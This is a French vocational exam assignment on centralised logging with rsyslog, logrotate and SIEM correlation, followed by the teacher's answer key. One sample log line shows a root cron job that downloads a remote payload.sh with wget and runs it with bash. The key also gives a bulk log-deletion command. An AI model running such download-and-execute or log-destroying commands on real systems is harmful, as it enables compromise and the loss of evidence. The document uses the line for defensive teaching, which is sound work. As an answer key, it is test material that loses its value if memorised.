# 📝 DEVOIR & LIVRABLE PORTFOLIO — S11 · 2ᵉ ANNÉE · E31
## Syslog centralisé · rsyslog · Filtres · logrotate · Corrélation SIEM

---

> **Module** : E31 – Administration des systèmes et réseaux
> **Épreuve visée** : **E31** – Administration systèmes
> **Durée totale** : Partie A en classe (45 min) + Partie B en autonomie (≈ 45 min)
> **Format du rendu** : Fiche complétée + fichiers de config rédigés

---

## 📌 Compétences évaluées

| Code | Compétence | Barème |
|---|---|---|
| **S5.1** | Format Syslog RFC 5424 : facility, severity, PRI | /20 |
| **S5.2** | rsyslog serveur + client : configuration | /20 |
| **S5.3** | Filtres et règles rsyslog | /25 |
| **S5.4** | logrotate : configuration et impact | /15 |
| **S5.5** | Corrélation Syslog ↔ SIEM | /20 |
| | **TOTAL** | **/100** |

---

## 🎯 Mise en situation professionnelle

> **Tu es administrateur système** pour une PME de 80 postes.
>
> Le responsable IT a décidé après un incident de sécurité (logs locaux supprimés par un attaquant) de mettre en place une **infrastructure de centralisation des logs** sur un nouveau serveur Linux.
>
> Il te confie les 3 missions suivantes :
> 1. Analyser les logs existants pour comprendre ce qui s'est passé
> 2. Écrire les fichiers de configuration rsyslog (serveur + clients)
> 3. Configurer la rotation et expliquer le lien avec le SIEM

---

## 🅰️ PARTIE A — En classe (45 min)

### 📋 Exercice 1 — Lire et décoder des messages Syslog (/20)

> Voici 5 lignes de logs extraites du serveur centralisé de la PME.

```
(A) Jan 20 14:32:11 db-server mysqld[2341]: [Warning] Aborted connection 1234 to db: 'prod_db' user: 'appuser' host: 'localhost'
(B) Jan 20 14:33:05 fw-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=192.168.1.1 PROTO=TCP DPT=22
(C) Jan 20 14:33:07 fw-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=192.168.1.1 PROTO=TCP DPT=22
(D) Jan 20 14:33:09 fw-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=192.168.1.1 PROTO=TCP DPT=22
(E) Jan 20 02:47:33 web-server cron[5671]: (root) CMD (/usr/bin/wget -q http://45.33.32.156/payload.sh -O /tmp/x.sh && bash /tmp/x.sh)
```

**1.a** — Pour chaque ligne, identifie : hostname · programme · message principal *(5 pts)*

| Ligne | Hostname | Programme | Message principal |
|---|---|---|---|
| A | | | |
| B | | | |
| C | | | |
| D | | | |
| E | | | |

**1.b** — Quel est le code facility et severity de la ligne B (`kernel` + blocage pare-feu) ?
Calcule la valeur PRI. *(5 pts)*

```
Facility "kern" = code : _______
Severity "warning" = code : _______
PRI = (Facility × 8) + Severity = (______ × 8) + ______ = ______
La ligne B devrait commencer par : <______>
```

**1.c** — Les lignes B, C, D proviennent de la même IP (`45.33.32.156`), en 4 secondes, sur le port 22 (SSH). Que représentent ces événements ? *(4 pts)*

```
Type d'attaque : ______________________________________________________________
Ce que le pare-feu a fait : ___________________________________________________
Ces 3 tentatives ont-elles réussi à atteindre le serveur SSH ? ☐ Oui ☐ Non
Pourquoi ? __________________________________________________________________
```

**1.d** — La ligne E est particulièrement grave. Explique précisément ce qu'elle révèle. *(6 pts)*

```
Heure : ________ (horaire normal ? ☐ Oui ☐ Non)
Programme : cron (tâche planifiée) → cela signifie : ____________________________
Commande exécutée : /usr/bin/wget http://45.33.32.156/payload.sh
  → Cette commande télécharge : ______________________________________________
  → Depuis l'IP : ______________ — cette IP est la même que dans les lignes _____
Action suivante : bash /tmp/x.sh → exécute le script téléchargé
Conclusion (gravité) : ☐ Événement normal ☐ Compromission confirmée
Preuve que c'est une backdoor : ______________________________________________
```

---

### ⌨️ Exercice 2 — Écrire les fichiers de configuration rsyslog (/20)

**2.a** — Écris le contenu du fichier `/etc/rsyslog.d/10-server.conf` pour le **serveur central** qui doit :
- Écouter en UDP ET TCP sur le port 514
- Stocker les logs distants dans `/var/log/distant/HOSTNAME/PROGRAMME.log` *(10 pts)*

```bash
# /etc/rsyslog.d/10-server.conf
# Serveur rsyslog central - PME
# Rédigé par : _________________ Date : __________

___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
```

**2.b** — Écris le contenu du fichier `/etc/rsyslog.d/50-forwarding.conf` pour le **client web-server** qui doit envoyer TOUS ses logs vers le serveur `192.168.50.10` via TCP : *(5 pts)*

```bash
# /etc/rsyslog.d/50-forwarding.conf
# Client web-server - forwarding centralisé

___________________________________________________________________________
___________________________________________________________________________
```

**2.c** — Quelle commande Linux permet de vérifier qu'il n'y a pas d'erreur de syntaxe dans les fichiers rsyslog ? Et quelle commande génère un message de test avec severity `auth.warning` ? *(5 pts)*

```
Vérification syntaxe : ________________________________________________________
Message de test : _____________________________________________________________
Vérifier la réception sur le serveur : ________________________________________
```

---

## 🅱️ PARTIE B — En autonomie (/55)

### 🎯 Exercice 3 — Règles de filtrage avancées (/25)

**3.a** — Écris le fichier `/etc/rsyslog.d/20-filters.conf` complet répondant aux besoins suivants : *(15 pts)*

| Besoin | Règle à écrire |
|---|---|
| Les echecs auth SSH → `/var/log/ssh_attacks.log` ET envoi SIEM sur 192.168.50.100:5514 | |
| Les messages `crit` ou pire (severity ≤ 2) → `/var/log/CRITICAL.log` | |
| Ignorer tous les messages `debug` | |
| Les logs du programme `nginx` → `/var/log/distant/nginx/access.log` | |

```bash
# /etc/rsyslog.d/20-filters.conf
# Règles de filtrage PME

# Règle 1 — Echecs auth SSH
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________

# Règle 2 — Critiques
___________________________________________________________________________
___________________________________________________________________________

# Règle 3 — Ignorer debug
___________________________________________________________________________

# Règle 4 — Nginx
___________________________________________________________________________
___________________________________________________________________________
```

**3.b** — Un administrateur a écrit cette règle. Elle contient une erreur critique. Trouve et corrige-la : *(5 pts)*

```bash
# Règle d'un collègue (contient une erreur)
if $msg contains "Accepted password" then {
    stop
}
if $syslogfacility-text == "auth" then {
    action(type="omfile" file="/var/log/auth.log")
}
```

```
Problème identifié : __________________________________________________________
Impact de cette erreur : ______________________________________________________
Correction : __________________________________________________________________
```

**3.c** — Quelle directive rsyslog permet de mettre les messages en file d'attente si le serveur centralisé est temporairement indisponible ? Donne un exemple de configuration. *(5 pts)*

```
Directive : __________________________________________________________________
Exemple :
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
Avantage : ___________________________________________________________________
```

---

### 🔄 Exercice 4 — Configuration logrotate (/15)

**4.a** — Écris le fichier `/etc/logrotate.d/rsyslog-pme` pour les logs distants qui doivent :
- Tourner chaque semaine
- Conserver 8 semaines d'historique
- Être compressés (mais pas le plus récent)
- Ne pas échouer si un fichier est absent *(10 pts)*

```bash
# /etc/logrotate.d/rsyslog-pme

___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
___________________________________________________________________________
```

**4.b** — Explique ce qu'il se passerait si `logrotate` n'était PAS configuré sur un serveur de logs centralisé qui reçoit les événements de 20 machines. *(5 pts)*

```
Effet à court terme (1 semaine) : _____________________________________________
Effet à moyen terme (1 mois) : ________________________________________________
Conséquence ultime : __________________________________________________________
Solution d'urgence si le disque est plein : ____________________________________
```

---

### 🔗 Exercice 5 — Corrélation Syslog ↔ SIEM (/20)

**5.a** — En t'appuyant sur les logs de l'exercice 1, quelle règle de corrélation SIEM aurait pu détecter la ligne E (cron malveillant) avant qu'elle soit exécutée ? *(5 pts)*

```
Règle de corrélation : ________________________________________________________
Déclencheur : _________________________________________________________________
Alerte générée : ______________________________________________________________
```

**5.b** — Le SIEM reçoit les logs rsyslog au format JSON. Écris l'exemple du message JSON correspondant à la ligne B de l'exercice 1 (blocage pare-feu UFW). *(8 pts)*

```json
{
  "@timestamp"  : "_______________________",
  "hostname"    : "_______________________",
  "program"     : "_______________________",
  "severity"    : "_______________________",
  "facility"    : "_______________________",
  "message"     : "_______________________",
  "source_ip"   : "_______________________",
  "dest_port"   : "_______________________"
}
```

**5.c** — Dessine le schéma complet de l'architecture de centralisation des logs de la PME, en incluant : les 3 sources (web-server, db-server, fw-01), le serveur rsyslog central, le SIEM, et les protocoles sur chaque lien. *(7 pts)*

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                                                                              │
│                                                                              │
│                                                                              │
│                                                                              │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 🏅 Barème global et grille Qualiopi

| Exercice | Compétences | Barème | Seuil |
|---|---|---|---|
| Ex. 1 — Analyse de logs réels | S5.1 | /20 | ≥ 11 |
| Ex. 2 — Config rsyslog serveur + client | S5.2 | /20 | ≥ 11 |
| Ex. 3 — Règles de filtrage | S5.3 | /25 | ≥ 14 |
| Ex. 4 — logrotate | S5.4 | /15 | ≥ 8 |
| Ex. 5 — Corrélation SIEM | S5.5 | /20 | ≥ 11 |
| **TOTAL** | | **/100** | **≥ 55** |

---

---

# ✅ CORRECTION ATTENDUE — Document Enseignant uniquement

## Correction Exercice 1

**1.a** :
- A : db-server · mysqld · connexion avortée
- B/C/D : fw-01 · kernel · blocage UFW sur port 22
- E : web-server · cron · téléchargement et exécution de script malveillant

**1.b** : kern=0, warning=4 → PRI = (0×8)+4 = **4** → `<4>`

**1.c** : Scan/tentative de connexion SSH répétée (brute force) → pare-feu a bloqué → BLOCK → les paquets n'ont pas atteint sshd

**1.d** : 02h47 (nuit) · tâche planifiée → cela signifie que l'attaquant a accès à crontab root → télécharge payload.sh depuis 45.33.32.156 (même IP que les tentatives SSH bloquées) → exécute immédiatement → **compromission confirmée** depuis un vecteur d'entrée antérieur (pas visible dans cet extrait) · Backdoor car exécution automatique à chaque reboot si ajoutée à @reboot

## Correction Exercice 2

**2.a** :
```bash
module(load="imudp")
input(type="imudp" port="514")
module(load="imtcp")
input(type="imtcp" port="514")

template(name="RemoteLogs" type="string"
         string="/var/log/distant/%HOSTNAME%/%PROGRAMNAME%.log")

if $FROMHOST-IP != "127.0.0.1" then {
    action(type="omfile" DynaFile="RemoteLogs" dirCreateMode="0755" FileCreateMode="0644")
    stop
}
```

**2.b** : `*.* @@192.168.50.10:514`

**2.c** : `rsyslogd -N1` · `logger -p auth.warning "test"` · `tail -f /var/log/distant/web-server/logger.log`

## Correction Exercice 3

**3.a** :
```bash
if $msg contains "Failed password" or $msg contains "authentication failure" then {
    action(type="omfile" file="/var/log/ssh_attacks.log")
    action(type="omfwd" target="192.168.50.100" port="5514" protocol="tcp")
}

if $syslogseverity <= 2 then {
    action(type="omfile" file="/var/log/CRITICAL.log")
}

if $syslogseverity == 7 then stop

if $programname == "nginx" then {
    action(type="omfile" file="/var/log/distant/nginx/access.log")
}
```

**3.b** : Erreur : le `stop` après `Accepted password` bloque TOUS les messages contenant "Accepted password" → ils ne seront jamais écrits dans /var/log/auth.log. Le `stop` doit être placé APRÈS l'action, pas avant. Corriger : supprimer le `stop` dans le premier bloc ou l'ajouter après l'action du deuxième bloc.

**3.c** :
```bash
action(type="omfwd" target="192.168.50.10" port="514" protocol="tcp"
       queue.type="LinkedList"
       queue.size="100000"
       action.resumeRetryCount="-1")
```
Avantage : aucun message perdu même si le serveur est indisponible plusieurs heures

## Correction Exercice 4

**4.a** :
```bash
/var/log/distant/*/*.log {
    weekly
    missingok
    rotate 8
    compress
    delaycompress
    notifempty
    sharedscripts
    postrotate
        /usr/lib/rsyslog/rsyslog-rotate
    endscript
    create 0640 syslog adm
}
```

**4.b** : Court terme : fichiers grossissent → disque se remplit progressivement / Moyen terme : disque plein → rsyslog ne peut plus écrire → perte de logs → incident invisible / Conséquence : serveur inutilisable, alertes SIEM muettes / Solution urgence : `find /var/log/distant -name "*.log" -size +100M -delete` + redémarrer rsyslog

## Correction Exercice 5

**5.a** : Règle : "Si un `wget` suivi d'un `bash` est exécuté via cron depuis root, vers une IP externe connue comme malveillante → alerte critique" · Plus réaliste : "Si une tâche cron root contient `wget` ou `curl` vers une IP non whitelistée → alerte"

**5.b** :
```json
{
  "@timestamp": "2024-01-20T14:33:05Z",
  "hostname": "fw-01",
  "program": "kernel",
  "severity": "warning",
  "facility": "kern",
  "message": "[UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=192.168.1.1 PROTO=TCP DPT=22",
  "source_ip": "45.33.32.156",
  "dest_port": "22"
}
```

---

*Devoir & Livrable Portfolio + Correction — Ne pas distribuer avant le rendu*
*BAC PRO CIEL | E31 Administration Systèmes | 2ᵉ année S11*
*Épreuve E31 | Compétences S5.1 · S5.2 · S5.3 · S5.4 · S5.5 · C2.4 · C3.1*
*Conforme référentiel Qualiopi*
